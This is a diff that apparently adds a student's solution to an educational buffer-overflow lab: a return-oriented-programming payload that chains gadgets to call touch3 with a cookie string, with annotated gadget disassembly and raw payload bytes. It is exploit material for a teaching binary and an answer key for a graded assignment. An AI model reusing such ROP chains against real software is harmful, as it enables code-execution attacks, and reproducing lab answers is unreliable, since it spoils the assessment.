@@ -69,3 +69,85 @@ b9 1e 42 00 00 00 00 00
 61 61 61 61 61 61
 61 61 61 61 61 61 61
 36 38 65 32 64 39 39 61 00
+
+
+
+
+
+
+
+
+0000000000421f27 <getval_312>:
+  421f27:	b8 48 89 e0 c3       	mov    $0xc3e08948,%eax
+  421f2c:	c3                   	retq  
+
+28 1f 42 00 00 00 00 00 # 421f28: 48 89 e0 (movq $rsp, $rax)
+
+0000000000421eec <add_xy>:
+  421eec:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  421ef0:	c3                   	retq  
+
+0000000000421eb0 <addval_447>:
+  421eb0:	8d 87 13 c8 58 90    	lea    -0x6fa737ed(%rdi),%eax
+  421eb6:	c3                   	retq   
+
+b4 1e 42 00 00 00 00 00 # 421eb4: 58 (popq $rax)
+
+0000000000421eb7 <addval_320>:
+  421eb7:	8d 87 48 89 c7 90    	lea    -0x6f3876b8(%rdi),%eax
+  421ebd:	c3                   	retq  
+
+b9 1e 42 00 00 00 00 00 # 421eb9: 48 89 c7 (movq $rax, $rdi)
+
+0000000000421ef1 <getval_249>:
+  421ef1:	b8 cb 09 89 d6       	mov    $0xd68909cb,%eax
+  421ef6:	c3                   	retq   
+
+f4 1e 42 00 00 00 00 00 # 421ef4: 89 d6 (movl $edx, $esi)
+
+0000000000421f5c <addval_303>:
+  421f5c:	8d 87 89 c1 c3 14    	lea    0x14c3c189(%rdi),%eax
+  421f62:	c3                   	retq   
+
+5e 1f 42 00 00 00 00 00 # 421f5e: 89 c1 (movl $eax, $ecx)
+
+0000000000421f3b <getval_145>:
+  421f3b:	b8 88 af 89 ca       	mov    $0xca89af88,%eax
+  421f40:	c3                   	retq   
+3e 1f 42 00 00 00 00 00 # 421f3e: 89 ca (movl $ecx, $edx)
+
+0000000000421eec <add_xy>:
+  421eec:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  421ef0:	c3                   	retq   
+
+ec 1e 42 00 00 00 00 00 # 421eec: 48 8d 04 37 (lea (%rdi,%rsi,1),%rax)
+
+
+xx xx xx xx xx xx xx xx    # padding 24 bytes
+28 1f 42 00 00 00 00 00 # 421f28: 48 89 e0 (movq $rsp, $rax)
+b9 1e 42 00 00 00 00 00 # 421eb9: 48 89 c7 (movq $rax, $rdi)
+b4 1e 42 00 00 00 00 00 # 421eb4: 58 (popq $rax)
+48 00 00 00 00 00 00 00
+5e 1f 42 00 00 00 00 00 # 421f5e: 89 c1 (movl $eax, $ecx)
+3e 1f 42 00 00 00 00 00 # 421f3e: 89 ca (movl $ecx, $edx)
+f4 1e 42 00 00 00 00 00 # 421ef4: 89 d6 (movl $edx, $esi)
+ec 1e 42 00 00 00 00 00 # 421eec: 48 8d 04 37 (lea (%rdi,%rsi,1),%rax)
+b9 1e 42 00 00 00 00 00 # 421eb9: 48 89 c7 (movq $rax, $rdi)
+22 1e 42 00 00 00 00 00 # address <touch3> 0x421e22
+36 38 65 32 64 39 39 61 00 # ascii of cookie 0x68e2d99a (string)
+
+61 61 61 61 61 61
+61 61 61 61 61 61
+61 61 61 61 61 61
+61 61 61 61 61 61
+28 1f 42 00 00 00 00 00 
+b9 1e 42 00 00 00 00 00 
+b4 1e 42 00 00 00 00 00 
+48 00 00 00 00 00 00 00
+5e 1f 42 00 00 00 00 00 
+3e 1f 42 00 00 00 00 00
+f4 1e 42 00 00 00 00 00 
+ec 1e 42 00 00 00 00 00
+b9 1e 42 00 00 00 00 00
+22 1e 42 00 00 00 00 00
+36 38 65 32 64 39 39 61 00
